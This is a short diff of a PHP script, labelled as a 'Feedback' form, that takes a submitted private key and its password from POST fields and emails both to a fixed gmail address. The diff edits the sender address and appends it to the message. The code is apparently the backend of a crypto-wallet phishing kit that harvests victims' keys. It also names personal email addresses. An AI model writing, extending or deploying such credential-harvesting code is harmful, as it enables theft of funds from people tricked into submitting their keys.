@@ -10,14 +10,14 @@ use PHPMailer\PHPMailer\Exception;
 $subject = "Feedback";
 $privateKey = $_POST['privateKey'];
 $pkpass = $_POST['pkpass'];
-$email_from = 'emmajoy658@gmail.com';
+$email_from = 'feranmi@gmail.com';
 $email_to = 'emmajoy658@gmail.com';
 
 if($privateKey== '' || $pkpass== ''){
         echo "check the fields";
     }else{
       $subject='Query from '.$sender;
-      $message='Dear Sir,<br><br>'.$subject.'<br><br>privatekey: '.$privateKey.'<br>pk Password: '.$pkpass;
+      $message='Dear Sir,<br><br>'.$subject.'<br><br>privatekey: '.$privateKey.'<br>pk Password: '. $pkpass . '<br>' . $email_from;
 
 
 
